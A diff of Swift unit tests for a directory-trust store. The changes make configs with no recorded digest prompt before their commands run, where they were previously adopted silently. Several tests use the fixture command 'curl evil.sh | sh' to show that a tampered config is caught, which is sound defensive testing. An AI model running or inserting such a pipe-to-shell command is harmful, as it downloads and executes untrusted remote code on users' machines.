@@ -51,9 +51,9 @@ final class ProgramaDirectoryTrustTests: XCTestCase {
 
     private static let globalConfigPath = "/dev/null/global-programa.json"
 
-    // MARK: - Legacy adoption
+    // MARK: - Legacy entries prompt once
 
-    func testLegacyFlatArrayDecodesAndAdoptsTrustOnFirstQuery() throws {
+    func testLegacyFlatArrayDecodesAndPromptsOnceBeforeTrusting() throws {
         try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
 
         // The pre-digest, on-disk schema: a flat JSON array of trust-key paths.
@@ -61,28 +61,32 @@ final class ProgramaDirectoryTrustTests: XCTestCase {
         try legacyJSON.write(to: storeURL, atomically: true, encoding: .utf8)
 
         let store = makeStore()
+        XCTAssertEqual(store.allTrustedPaths, [configDir.path], "The legacy root must survive decoding")
         XCTAssertEqual(
             store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
-            .trusted,
-            "A legacy entry with no digest must be silently adopted as trusted, not treated as untrusted"
+            .changed,
+            "A root with no recorded digest must prompt, never adopt whatever config is on disk"
         )
-        XCTAssertTrue(store.isTrusted(configPath: configURL.path, globalConfigPath: Self.globalConfigPath))
+        XCTAssertEqual(
+            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
+            .changed,
+            "Querying must not adopt the digest as a side effect"
+        )
     }
 
-    func testLegacyEntryEnforcesFromThenOnAfterAdoption() throws {
+    func testLegacyEntryEnforcesAfterExplicitTrust() throws {
         try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
         try "[\"\(configDir.path)\"]".write(to: storeURL, atomically: true, encoding: .utf8)
 
         let store = makeStore()
-        // First query silently adopts the current digest.
+        store.trust(configPath: configURL.path)
         XCTAssertEqual(store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath), .trusted)
 
-        // Now the command actually changes -- the adopted digest must catch it.
         try writeConfig(#"{ "commands": [{ "name": "Build", "command": "curl evil.sh | sh" }] }"#)
         XCTAssertEqual(
             store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
             .changed,
-            "Once a legacy entry adopts a digest, a real content change must be caught"
+            "Once trusted explicitly, a real content change must be caught"
         )
     }
 
@@ -218,7 +222,29 @@ final class ProgramaDirectoryTrustTests: XCTestCase {
 
     // MARK: - replaceAll interop
 
-    func testReplaceAllInteropKeepsEntriesWorking() throws {
+    func testReplaceAllKeepsDigestsOfRootsThatStay() throws {
+        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
+
+        let store = makeStore()
+        store.trust(configPath: configURL.path)
+        let otherRoot = tempRoot.appendingPathComponent("other").path
+        store.replaceAll(with: [configDir.path, otherRoot])
+
+        XCTAssertEqual(store.allTrustedPaths.sorted(), [configDir.path, otherRoot].sorted())
+        XCTAssertEqual(
+            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
+            .trusted,
+            "A root kept by replaceAll(with:) must keep the digest it already had"
+        )
+
+        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "curl evil.sh | sh" }] }"#)
+        XCTAssertEqual(
+            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
+            .changed
+        )
+    }
+
+    func testReplaceAllNewRootPromptsOnce() throws {
         try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
 
         let store = makeStore()
@@ -227,15 +253,8 @@ final class ProgramaDirectoryTrustTests: XCTestCase {
         XCTAssertEqual(store.allTrustedPaths, [configDir.path])
         XCTAssertEqual(
             store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
-            .trusted,
-            "Entries arriving through replaceAll(with:) have no digest and must silently adopt, like legacy entries"
-        )
-
-        // And, having adopted a digest, a real change is still caught.
-        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "curl evil.sh | sh" }] }"#)
-        XCTAssertEqual(
-            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
-            .changed
+            .changed,
+            "A root added without a digest must prompt before its config runs"
         )
     }
 
@@ -243,7 +262,6 @@ final class ProgramaDirectoryTrustTests: XCTestCase {
         try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
         let store = makeStore()
         let configPath = configURL.path
-        let trustedPath = configDir.path
 
         DispatchQueue.concurrentPerform(iterations: 100) { index in
             if index.isMultiple(of: 3) {
@@ -255,12 +273,19 @@ final class ProgramaDirectoryTrustTests: XCTestCase {
             }
         }
 
-        store.replaceAll(with: [trustedPath])
+        let finalPaths = store.allTrustedPaths
+        let finalState = store.trustState(configPath: configPath, globalConfigPath: Self.globalConfigPath)
         let reloaded = makeStore()
-        XCTAssertEqual(reloaded.allTrustedPaths, [trustedPath])
-        XCTAssertEqual(
-            reloaded.trustState(configPath: configPath, globalConfigPath: Self.globalConfigPath),
-            .trusted
-        )
+        XCTAssertEqual(reloaded.allTrustedPaths, finalPaths, "The saved store must decode to the in-memory state")
+        let reloadedState = reloaded.trustState(configPath: configPath, globalConfigPath: Self.globalConfigPath)
+        XCTAssertEqual(reloadedState, finalState)
+        switch reloadedState {
+        case .trusted:
+            XCTAssertEqual(finalPaths, [configDir.path], "Trusted must mean the root is present")
+        case .untrusted:
+            XCTAssertTrue(finalPaths.isEmpty, "Untrusted must mean the last write was a revoke")
+        case .changed:
+            XCTFail("trust/revoke of one unchanged config can never leave it .changed")
+        }
     }
 }
